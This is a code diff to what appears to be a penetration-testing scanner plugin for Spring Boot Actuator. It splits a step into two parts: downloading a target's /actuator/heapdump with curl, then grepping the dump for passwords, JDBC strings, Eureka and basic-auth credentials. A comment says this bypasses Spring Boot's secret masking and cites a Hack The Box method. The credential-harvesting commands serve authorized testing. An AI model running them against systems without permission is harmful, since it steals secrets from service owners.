@@ -264,26 +264,35 @@ class SpringBootActuator(ServiceScan):
 					service.info(f"📥 Downloading heapdump for RAW credential extraction (bypasses ******)...")
 					heapdump_creds_file = f'{{scandir}}/CREDENTIALS_{{port}}_{hostname_label}.txt'
 					raw_creds_file = f'{{scandir}}/RAW_CREDENTIALS_{{port}}_{hostname_label}.txt'
-					# Download heapdump without streaming through CommandStreamReader (avoids UTF-8 decode error)
 					heapdump_file = f'{{scandir}}/heapdump_{{port}}_{hostname_label}.hprof'
+					
+					# Step 1: Download heapdump in completely separate command (no binary through CommandStreamReader)
+					service.info(f"🔽 Step 1: Downloading binary heapdump file...")
 					await service.execute(
-						f'echo "=== Downloading heapdump (bypasses Spring Boot masking) ===" && '
+						f'echo "=== Downloading heapdump binary file ===" && '
 						f'curl -s -m {timeout*6} {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump '
-						f'-o {heapdump_file} >/dev/null 2>&1 && '
+						f'-o {heapdump_file} 2>/dev/null && '
+						f'echo "Download completed - size: $(stat -c%s {heapdump_file} 2>/dev/null || echo unknown) bytes"',
+						outfile=None  # No file output to avoid binary issues
+					)
+					
+					# Step 2: Process the downloaded file for credentials
+					service.info(f"🔍 Step 2: Extracting credentials from downloaded heapdump...")
+					await service.execute(
 						f'if [ -f {heapdump_file} ]; then '
 						f'  echo "🔍 Extracting RAW credentials from heapdump memory..." && '
 						f'  echo "=== RAW password= patterns (Furni HTB method) ===" && '
-						f'  strings {heapdump_file} | grep "password=" | head -20; '
+						f'  strings {heapdump_file} | grep "password=" | head -20 && '
 						f'  echo "=== RAW user/password pairs ===" && '
-						f'  strings {heapdump_file} | grep -E "{{password=.*&.*user=|user=.*password=}}" | head -10; '
+						f'  strings {heapdump_file} | grep -E "{{password=.*&.*user=|user=.*password=}}" | head -10 && '
 						f'  echo "=== PWD environment variables ===" && '
-						f'  strings {heapdump_file} | grep "PWD" | head -15; '
+						f'  strings {heapdump_file} | grep "PWD" | head -15 && '
 						f'  echo "=== Eureka server credentials (EurekaSrvr pattern) ===" && '
-						f'  strings {heapdump_file} | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10; '
+						f'  strings {heapdump_file} | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10 && '
 						f'  echo "=== Database connection strings ===" && '
-						f'  strings {heapdump_file} | grep "jdbc:" | head -10; '
+						f'  strings {heapdump_file} | grep "jdbc:" | head -10 && '
 						f'  echo "=== HTTP Basic Auth URLs ===" && '
-						f'  strings {heapdump_file} | grep -E "://.*:.*@" | head -10; '
+						f'  strings {heapdump_file} | grep -E "://.*:.*@" | head -10 && '
 						f'  echo "=== Creating RAW credentials file ===" && '
 						f'  echo "--- RAW CREDENTIALS EXTRACTED FROM HEAPDUMP ---" > {raw_creds_file} && '
 						f'  echo "Source: {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump" >> {raw_creds_file} && '
@@ -305,9 +314,9 @@ class SpringBootActuator(ServiceScan):
 						f'  echo "[DATABASE CONNECTIONS]" >> {raw_creds_file} && '
 						f'  strings {heapdump_file} | grep "jdbc:" >> {raw_creds_file} && '
 						f'  echo "✅ RAW credentials saved to: {raw_creds_file}" && '
-						f'  echo "⚠️  Check both files for complete results"; '
+						f'  echo "⚠️  Check the credentials file for actual passwords"; '
 						f'else '
-						f'  echo "❌ Heapdump download failed"; '
+						f'  echo "❌ Heapdump download failed - file not found"; '
 						f'fi',
 						outfile=heapdump_outfile
 					)
